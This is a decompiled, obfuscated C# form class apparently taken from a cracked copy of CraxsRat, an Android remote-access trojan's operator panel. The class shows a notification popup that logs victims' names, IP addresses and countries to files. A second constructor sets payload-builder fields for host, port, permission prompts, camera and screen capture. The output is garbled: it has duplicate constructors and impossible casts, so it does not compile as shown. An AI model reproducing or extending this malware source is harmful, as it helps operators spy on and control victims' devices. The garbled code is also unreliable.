// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Craxspopup
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Craxspopup : Form
  {
    public int bottomHeight;
    public const int CS_DROPSHADOW = 131072;
    public const int WM_NCPAINT = 133;
    public Color TopLeftColor;
    public Color TopRightColor;
    public Color BottomLeftColor;
    public Color BottomRightColor;
    private IContainer components;

    [field: AccessedThroughProperty("Panel1")]
    internal virtual Panel Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Panel2")]
    internal virtual Panel Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Panel3")]
    internal virtual Panel Panel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Panel4")]
    internal virtual Panel Panel4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Panel Panel5
    {
      get => ((CraxsStore) this)._Panel5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsStore) this)._Panel5 = value;
    }

    internal virtual TextBox notifitext
    {
      get => ((CraxsStore) this)._notifitext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsStore) this)._notifitext = value;
    }

    internal virtual DrakeUIButtonIcon checkbutton
    {
      get => ((CraxsStore) this)._checkbutton;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Checkbutton_Click);
        DrakeUIButtonIcon checkbutton = ((CraxsStore) this)._checkbutton;
label_1:
        int num1 = 1220981515;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (1673905953 - (--~~num2 - (1537247646 ^ 984621316)))) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              checkbutton.Click -= eventHandler;
              num1 = (int) num3 * 2113668051 ^ -860976604;
              continue;
            case 2:
              checkbutton.Click += eventHandler;
              num1 = (int) num3 * 181536425 ^ 1543089553;
              continue;
            case 3:
              goto label_3;
            case 4:
              int num4 = checkbutton == null ? -1164084874 : (num4 = 1670040405);
              num1 = num4 ^ (int) num3 * 708732563;
              continue;
            case 5:
              ((CraxsStore) this)._checkbutton = value;
              checkbutton = ((CraxsStore) this)._checkbutton;
              num1 = -1655169363;
              continue;
            case 6:
              int num5 = checkbutton == null ? 869311959 : (num5 = 195111245);
              num1 = num5 ^ (int) num3 * 1513794606;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
    {
      get => ((CraxsStore) this)._DrakeUIButtonIcon1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click);
        DrakeUIButtonIcon drakeUiButtonIcon1 = ((CraxsStore) this)._DrakeUIButtonIcon1;
        if (drakeUiButtonIcon1 == null)
          goto label_5;
label_1:
        int num1 = -540023021;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(~-(num1 - (~(-1208167099 - 196252375) - (738828212 + ~-280095636) + --1199570293) * -2100796257 - ((--806173760 ^ -1663473643) + 915360255 + -106294627 * ((1209439824 - 295044136) * -1778129287))) ^ 668189649 + 139604569)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              drakeUiButtonIcon1 = ((CraxsStore) this)._DrakeUIButtonIcon1;
              num1 = (int) num2 * 667938985 ^ 1443881970;
              continue;
            case 2:
              goto label_1;
            case 3:
              drakeUiButtonIcon1.Click -= eventHandler;
              num1 = (int) num2 * 522984197 ^ 1494980666;
              continue;
            case 4:
              drakeUiButtonIcon1.Click += eventHandler;
              num1 = (int) num2 * -1483368462 ^ -24090173;
              continue;
            case 5:
              int num3 = drakeUiButtonIcon1 == null ? 137652786 : (num3 = 222401295);
              num1 = num3 ^ (int) num2 * -851304891;
              continue;
            case 6:
              goto label_5;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_5:
        ((CraxsStore) this)._DrakeUIButtonIcon1 = value;
        num1 = -1042058869;
        goto label_2;
      }
    }

    internal virtual DrakeUIToolTip ToolTips
    {
      get => ((CraxsStore) this)._ToolTips;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsStore) this)._ToolTips = value;
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
    {
      get => ((CraxsStore) this)._DrakeUIButtonIcon2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon2_Click);
        DrakeUIButtonIcon drakeUiButtonIcon2 = ((CraxsStore) this)._DrakeUIButtonIcon2;
label_1:
        int num1 = 779650688;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(~~num1 * 1895946173 ^ --1667757224 - 299086241) - 134660927)) % 6U)
          {
            case 0:
              ((CraxsStore) this)._DrakeUIButtonIcon2 = value;
              drakeUiButtonIcon2 = ((CraxsStore) this)._DrakeUIButtonIcon2;
              int num3;
              num1 = num3 = drakeUiButtonIcon2 == null ? -1064652609 : (num3 = -378101948);
              continue;
            case 1:
              int num4 = drakeUiButtonIcon2 == null ? -117443683 : (num4 = 252794468);
              num1 = num4 ^ (int) num2 * -890611088;
              continue;
            case 2:
              goto label_1;
            case 3:
              drakeUiButtonIcon2.Click -= eventHandler;
              num1 = (int) num2 * 814263897 ^ 1488494104;
              continue;
            case 4:
              goto label_3;
            case 5:
              drakeUiButtonIcon2.Click += eventHandler;
              num1 = (int) num2 * 620995295 ^ 1765841516;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public Craxspopup()
    {
label_1:
      int num1 = 2012569836;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -((~-num1 - (--397288978 - (1290444892 ^ -421029587) - -(-49070235 ^ -1045725223))) * -1648116375 ^ -1463482540)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            this.Deactivate += new EventHandler(this.Craxsnotification_Deactivate);
            ((CraxsMsgbox.NativeConstants) this).InitializeComponent();
            num1 = (int) num2 * 1298852666 ^ -1015821344;
            continue;
          case 2:
            this.Load += new EventHandler(this.Craxsnotification_Load);
            num1 = (int) num2 * 1097367382 ^ 729373001;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    private void Craxsnotification_Load(object sender, EventArgs e)
    {
      Point position = Cursor.Position;
      int x = checked (position.X - 79);
      position = Cursor.Position;
      int y = position.Y;
      this.Location = new Point(x, y);
      this.BackColor = Color.DarkRed;
label_1:
      int num1 = -289412504;
      while (true)
      {
        int num2 = num1;
        uint num3;
        int index;
        string[] notifications;
        switch ((num3 = (uint) ~-(852606159 * (2101394027 * 1519277243) - (-(-1498144595 * -(1420279743 * 1226871267)) - (num2 ^ (--779190285 - 125719420) * 242962201 - 699564983 * ~(-1853815873 * -1831152331) + -(649233526 * 1335645863 ^ -378662428) * -2042215039)) * 347253109)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
label_6:
            if (index < notifications.Length)
            {
              num1 = 1759656429;
              continue;
            }
            goto label_23;
          case 2:
            // ISSUE: reference to a compiler-generated field
            if (((IEnumerable<string>) ((Data._Closure\u0024__) ((CraxsStore) this).ClassClient).Notifications).Count<string>() > 0)
            {
              num1 = (int) num3 * 1278152954 ^ 1526508065;
              continue;
            }
            goto label_24;
          case 3:
            this.notifitext.Text = EXGuarder.\u00319404C5C;
            // ISSUE: reference to a compiler-generated field
            notifications = ((Data._Closure\u0024__) ((CraxsStore) this).ClassClient).Notifications;
            num1 = (int) num3 * 546152336 ^ 700911790;
            continue;
          case 4:
            this.TransparencyKey = Color.DarkRed;
            if (((CraxsStore) this).ClassClient != null)
            {
              num1 = (int) num3 * 2104821355 ^ 599351069;
              continue;
            }
            goto label_23;
          case 6:
            index = 0;
            num1 = (int) num3 * 1103041093 ^ 1912977000;
            continue;
          default:
            string str1 = notifications[index];
            try
            {
              if (str1 != null)
              {
label_13:
                int num4 = -2022527637;
                while (true)
                {
                  int num5 = num4;
                  uint num6;
                  switch ((num6 = (uint) ~-(852606159 * (2101394027 * 1519277243) - (-(-1498144595 * -(1420279743 * 1226871267)) - (num5 ^ (--779190285 - 125719420) * 242962201 - 699564983 * ~(-1853815873 * -1831152331) + -(649233526 * 1335645863 ^ -378662428) * -2042215039)) * 347253109)) % 4U)
                  {
                    case 0:
                      goto label_13;
                    case 1:
                      int num7 = str1.Length <= 0 ? -197614540 : (num7 = -184198029);
                      num4 = num7 ^ (int) num6 * -293354819;
                      continue;
                    case 2:
                      TextBox notifitext;
                      string str2 = (notifitext = this.notifitext).Text + str1 + EXGuarder.\u003206A0E2E;
                      notifitext.Text = str2;
                      num4 = (int) num6 * -1908084625 ^ -82247549;
                      continue;
                    default:
                      goto label_18;
                  }
                }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
label_18:
            checked { ++index; }
            break;
        }
label_19:
        int num8 = -1856682542;
label_20:
        int num9 = num8;
        uint num10;
        switch ((num10 = (uint) ~-(852606159 * (2101394027 * 1519277243) - (-(-1498144595 * -(1420279743 * 1226871267)) - (num9 ^ (--779190285 - 125719420) * 242962201 - 699564983 * ~(-1853815873 * -1831152331) + -(649233526 * 1335645863 ^ -378662428) * -2042215039)) * 347253109)) % 5U)
        {
          case 0:
            break;
          case 1:
            goto label_6;
          case 2:
            goto label_19;
          case 3:
            goto label_24;
          case 4:
            goto label_22;
          default:
            goto label_21;
        }
label_23:
        // ISSUE: reference to a compiler-generated field
        ((Data._Closure\u0024__39\u002D17) ((CraxsStore) this).ClassClient).isnewnotifi = false;
        num8 = 1056021548;
        goto label_20;
label_24:
        TextBox notifitext1;
        string str3 = (notifitext1 = this.notifitext).Text + EXGuarder.\u0031C0F156D;
        notifitext1.Text = str3;
        num8 = 280089157;
        goto label_20;
      }
label_22:
      return;
label_21:;
    }

    private void DrakeUIButton1_Click(object sender, EventArgs e)
    {
    }

    private void Craxsnotification_Deactivate(object sender, EventArgs e) => this.Close();

    private void Checkbutton_Click(object sender, EventArgs e)
    {
      this.notifitext.Text = EXGuarder.\u00304622512;
label_1:
      int num1 = -189579054;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(num1 - 85644155 * (--838188414 ^ -92190267 * -(-1598293821 ^ 1319370702)) ^ ~~(799756009 - 2014054759 ^ 397175260 + 2087595591)) * 2087554495 - ~-2016783542 - -771047235)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            // ISSUE: reference to a compiler-generated field
            ((Data._Closure\u0024__) ((CraxsStore) this).ClassClient).Notifications = new string[251];
            num1 = (int) num2 * -1119914878 ^ 1670293394;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      this.Close();
    }

    private void DrakeUIButtonIcon2_Click(object sender, EventArgs e) => this.Close();

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
      if (string.IsNullOrEmpty(this.notifitext.Text))
      {
label_1:
        int num1 = 2041243820;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-((num1 ^ -(-243220497 * -(986440678 - -937750572)) ^ -(-1148372152 - (-672102263 ^ 213282246)) + ~(-231316770 - -194893995 ^ 1469433414)) * 1131798563) - 1233321300 ^ 1966792588)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              CraxsAlert.Showinformation(EXGuarder.\u00310116062);
              num1 = (int) num2 * 2036496652 ^ 895329363;
              continue;
            case 2:
              goto label_9;
            default:
              goto label_5;
          }
        }
label_9:
        return;
label_5:;
      }
      else
      {
        try
        {
          // ISSUE: reference to a compiler-generated field
          if (Directory.Exists(((Data._Closure\u0024__39\u002D12) ((CraxsStore) this).ClassClient).FolderUSER + EXGuarder.\u0035339680A))
            goto label_16;
label_7:
          int num3 = -458047616;
label_8:
          DateTime now;
          string str;
          while (true)
          {
            uint num4;
            switch ((num4 = (uint) (-((num3 ^ -(-243220497 * -(986440678 - -937750572)) ^ -(-1148372152 - (-672102263 ^ 213282246)) + ~(-231316770 - -194893995 ^ 1469433414)) * 1131798563) - 1233321300 ^ 1966792588)) % 10U)
            {
              case 0:
                goto label_7;
              case 1:
                // ISSUE: reference to a compiler-generated field
                string path = ((Data._Closure\u0024__39\u002D12) ((CraxsStore) this).ClassClient).FolderUSER + EXGuarder.\u00376581224 + str;
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                string[] strArray = new string[9]
                {
                  EXGuarder.\u0031B09140C,
                  ((Data._Closure\u0024__39\u002D12) ((CraxsStore) this).ClassClient).ClientName,
                  EXGuarder.\u0036D5B152B,
                  ((Data) ((CraxsStore) this).ClassClient).ClientAddressIP,
                  EXGuarder.\u003533A2516,
                  ((Data._Closure\u0024__39\u002D11) ((CraxsStore) this).ClassClient).Country,
                  EXGuarder.\u003275C0C2D,
                  null,
                  null
                };
                now = DateTime.Now;
                strArray[7] = now.ToString();
                strArray[8] = EXGuarder.\u00300412665;
                string contents = string.Concat(strArray);
                File.AppendAllText(path, contents);
                num3 = (int) num4 * 9248872 ^ 1157123411;
                continue;
              case 2:
                goto label_3;
              case 3:
                // ISSUE: reference to a compiler-generated field
                int num5 = File.Exists(((Data._Closure\u0024__39\u002D12) ((CraxsStore) this).ClassClient).FolderUSER + EXGuarder.\u00376581224 + str) ? -1016144774 : (num5 = 1516650848);
                num3 = num5 ^ (int) num4 * 1692405985;
                continue;
              case 4:
                // ISSUE: reference to a compiler-generated field
                Process.Start(((Data._Closure\u0024__39\u002D12) ((CraxsStore) this).ClassClient).FolderUSER + EXGuarder.\u0035339680A);
                num3 = (int) num4 * 1377932879 ^ -1785665763;
                continue;
              case 5:
                str = now.ToString(EXGuarder.\u0034E6E691B) + EXGuarder.\u00373093917;
                num3 = (int) num4 * 595323647 ^ -319842491;
                continue;
              case 6:
                // ISSUE: reference to a compiler-generated field
                File.AppendAllText(((Data._Closure\u0024__39\u002D12) ((CraxsStore) this).ClassClient).FolderUSER + EXGuarder.\u00376581224 + str, str + this.notifitext.Text + EXGuarder.\u0036003470C);
                num3 = 222384285;
                continue;
              case 7:
                goto label_16;
              case 8:
                // ISSUE: reference to a compiler-generated field
                File.Create(((Data._Closure\u0024__39\u002D12) ((CraxsStore) this).ClassClient).FolderUSER + EXGuarder.\u00376581224 + str).Dispose();
                num3 = (int) num4 * 850329861 ^ 380193922;
                continue;
              case 9:
                // ISSUE: reference to a compiler-generated field
                Directory.CreateDirectory(((Data._Closure\u0024__39\u002D12) ((CraxsStore) this).ClassClient).FolderUSER + EXGuarder.\u0035339680A);
                num3 = (int) num4 * 555973983 ^ -948598259;
                continue;
              default:
                goto label_19;
            }
          }
label_3:
          return;
label_19:
          return;
label_16:
          now = DateTime.Now;
          num3 = -998718606;
          goto label_8;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public Craxspopup()
    {
label_1:
      int num1 = -642595953;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~~(~(num1 ^ (-(2099461548 - 1780956245 ^ -644460130) ^ ~~-1137793432) - (-~(1428961209 ^ -1814455755) ^ 581373152 ^ -49584463 * 1188385405 ^ 438918618 - 701050548)) * -108337041)) % 42U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).appnamebuild = EXGuarder.\u0034701525F;
            num1 = (int) num2 * 2102086101 ^ -1272440847;
            continue;
          case 1:
            ((CraxsStore) this).need_boot = (object) false;
            num1 = (int) num2 * -1494993573 ^ 1937676271;
            continue;
          case 2:
            ((CraxsStore) this).newsndmthd = EXGuarder.\u0034701525F;
            ((CraxsStore) this).newforuce = EXGuarder.\u0034701525F;
            num1 = (int) num2 * 1926520241 ^ 145818606;
            continue;
          case 3:
            ((CraxsStore) this).loadfaild = false;
            num1 = (int) num2 * 1858724694 ^ 316925807;
            continue;
          case 4:
            ((CraxsStore) this).N__ask_draw_ = EXGuarder.\u0034701525F;
            num1 = (int) num2 * -1004532339 ^ 1786390761;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).rshit = (Random) null;
            num1 = (int) num2 * 1910026 ^ 637636397;
            continue;
          case 6:
            ((CraxsStore) this).N__access_ask_ = EXGuarder.\u003613D791F;
            ((CraxsStore) this).N_newEngineWorkerins = EXGuarder.\u0035F4D1872;
            num1 = (int) num2 * 487012695 ^ -1212182978;
            continue;
          case 7:
            // ISSUE: reference to a compiler-generated field
            ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).oncedelete = true;
            // ISSUE: reference to a compiler-generated field
            ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this)._Time = 10;
            num1 = (int) num2 * -1990837626 ^ -956218253;
            continue;
          case 8:
            // ISSUE: reference to a compiler-generated field
            ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).cou = 1;
            num1 = (int) num2 * 1281696668 ^ -939180507;
            continue;
          case 9:
            ((CraxsStore) this).newgetbyts = EXGuarder.\u0034701525F;
            ((CraxsStore) this).newsrvrun = EXGuarder.\u0034701525F;
            ((CraxsStore) this).split1 = EXGuarder.\u0034701525F;
            ((CraxsStore) this).split2 = EXGuarder.\u0034701525F;
            ((CraxsStore) this).split3 = EXGuarder.\u0034701525F;
            ((CraxsStore) this).split4 = EXGuarder.\u0034701525F;
            ((CraxsStore) this).newhost = EXGuarder.\u0034701525F;
            num1 = (int) num2 * -608374731 ^ 786738195;
            continue;
          case 10:
            ((CraxsStore) this).loadingtext = EXGuarder.\u0033720612F;
            ((CraxsStore) this).conecttext = EXGuarder.\u003415C6872;
            ((CraxsStore) this).stage1 = false;
            num1 = (int) num2 * 1557821743 ^ -1905353541;
            continue;
          case 11:
            ((CraxsStore) this).need_write = (object) false;
            num1 = (int) num2 * -1606105701 ^ -1689987100;
            continue;
          case 12:
            // ISSUE: reference to a compiler-generated field
            ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).NEWRANDOM = EXGuarder.\u0034701525F;
            num1 = (int) num2 * 753205298 ^ 1857739574;
            continue;
          case 13:
            ((CraxsStore) this).neweco = EXGuarder.\u0034701525F;
            num1 = (int) num2 * 405099970 ^ 1090988408;
            continue;
          case 14:
            ((CraxsStore) this).newkey = EXGuarder.\u0034701525F;
            ((CraxsStore) this).newalive = EXGuarder.\u0034701525F;
            ((CraxsStore) this).newname = EXGuarder.\u0034701525F;
            num1 = (int) num2 * 1299216738 ^ 830586891;
            continue;
          case 15:
            ((CraxsStore) this).newcnm = EXGuarder.\u0034701525F;
            num1 = (int) num2 * 657745660 ^ 1732743426;
            continue;
          case 16:
            // ISSUE: reference to a compiler-generated field
            ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).StartedZip = false;
            num1 = (int) num2 * 1537252429 ^ 1328820755;
            continue;
          case 17:
            ((CraxsStore) this).need_read = (object) false;
            num1 = (int) num2 * 509268503 ^ 187325686;
            continue;
          case 18:
            ((CraxsStore) this).newport = EXGuarder.\u0034701525F;
            num1 = (int) num2 * -1696359348 ^ 1214226002;
            continue;
          case 20:
            ((CraxsStore) this).newsokt = EXGuarder.\u0034701525F;
            ((CraxsStore) this).newstrtconct = EXGuarder.\u0034701525F;
            ((CraxsStore) this).newcnl = EXGuarder.\u0034701525F;
            num1 = (int) num2 * -1767533061 ^ 1231325913;
            continue;
          case 21:
            // ISSUE: reference to a compiler-generated field
            ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).FolderApk = false;
            num1 = (int) num2 * 468383102 ^ -1908964704;
            continue;
          case 22:
            ((CraxsStore) this).loadsuccess = false;
            num1 = (int) num2 * -218451268 ^ -1441240623;
            continue;
          case 23:
            ((CraxsStore) this).N__scctrl_ = EXGuarder.\u0031B061022;
            num1 = (int) num2 * -262085730 ^ 339817073;
            continue;
          case 24:
            ((CraxsStore) this).need_syswinow = (object) false;
            num1 = (int) num2 * -434849525 ^ -1883581713;
            continue;
          case 25:
            ((CraxsStore) this).stage2 = false;
            num1 = (int) num2 * -2051724426 ^ 264184100;
            continue;
          case 26:
            ((CraxsStore) this).newconect = EXGuarder.\u0034701525F;
            num1 = (int) num2 * -1899579106 ^ 73733152;
            continue;
          case 27:
            goto label_1;
          case 28:
            ((CraxsStore) this).N__CamActivity_ = EXGuarder.\u0034701525F;
            num1 = (int) num2 * 1046526619 ^ -861796990;
            continue;
          case 29:
            ((CraxsStore) this).need_forground = (object) false;
            num1 = (int) num2 * -700771205 ^ 1290354473;
            continue;
          case 30:
            ((CraxsStore) this).N__srv_worker_ = EXGuarder.\u00371094845;
            ((CraxsStore) this).N_cap_sc_ = EXGuarder.\u0030F621037;
            num1 = (int) num2 * 1696069454 ^ 591207035;
            continue;
          case 31:
            // ISSUE: reference to a compiler-generated field
            ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).TK = EXGuarder.\u00367231F6E;
            num1 = (int) num2 * -1086690641 ^ 2122751461;
            continue;
          case 32:
            ((CraxsStore) this).N__SCRActivity_ = EXGuarder.\u0034701525F;
            num1 = (int) num2 * -914577796 ^ 1507192288;
            continue;
          case 33:
            // ISSUE: reference to a compiler-generated field
            ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).cou3 = 1;
            num1 = (int) num2 * 596706105 ^ -1759179756;
            continue;
          case 34:
            ((CraxsStore) this).need_all = (object) false;
            ((CraxsStore) this).ASKPRIM_all = (object) false;
            ((CraxsStore) this).N__ask_prim_ = EXGuarder.\u0036D273664;
            num1 = (int) num2 * 860389693 ^ -324942988;
            continue;
          case 35:
            ((CraxsStore) this).N_update_app_ = EXGuarder.\u0030E1E602E;
            ((CraxsStore) this).N_WackMeUpJob = EXGuarder.\u00368601A37;
            num1 = (int) num2 * 657150476 ^ 1487506216;
            continue;
          case 36:
            ((CraxsStore) this).N_ClassGen = EXGuarder.\u0031B061022;
            num1 = (int) num2 * 1576737125 ^ 1666841866;
            continue;
          case 37:
            ((CraxsStore) this).N__ask_battary_ = EXGuarder.\u0034701525F;
            num1 = (int) num2 * -588801433 ^ -128160323;
            continue;
          case 38:
            // ISSUE: reference to a compiler-generated field
            ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).newplgs = EXGuarder.\u0034701525F;
            num1 = (int) num2 * -758040989 ^ -707268296;
            continue;
          case 39:
            // ISSUE: reference to a compiler-generated field
            ((CraxsStore.VB\u0024StateMachine_389_CraxsRatkfvuiorkenfudpajrsnCraxsRatssdfwsbyj) this).ALLPRIMSLIST = new List<string>();
            num1 = (int) num2 * 404637139 ^ 1723277240;
            continue;
          case 40:
            ((CraxsStore) this).N__webviewer_ = EXGuarder.\u0034701525F;
            num1 = (int) num2 * 1846696490 ^ 2042633253;
            continue;
          case 41:
            this.Load += new EventHandler(((CraxsStore) this).CraxsRatkfvuiorkenfudpajrsnCraxsRatstughes);
            num1 = (int) num2 * -200509212 ^ 571741476;
            continue;
          default:
            goto label_43;
        }
      }
label_43:
      ((CraxsStore) this).InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = -1886715502;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((-363645348 * -1976353053 - ((num2 - (--1813772542 * 2089693973 * 1200604205 - (-359235146 - 1060820411 * (2020356303 - 124089353 - (-33331495 - 1975557876))))) * 1095575857 + (716242641 * 1572827337 - 1377770179 + (-787984886 - -1939052523))) * 1938477751) * 1608613785)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              ((CraxsStore) this).components.Dispose();
              num1 = (int) num3 * -35982239 ^ -1989491666;
              continue;
            case 2:
              int num4 = ((CraxsStore) this).components == null ? -1786414241 : (num4 = -912108651);
              num1 = num4 ^ (int) num3 * 344952280;
              continue;
            case 3:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }
  }
}
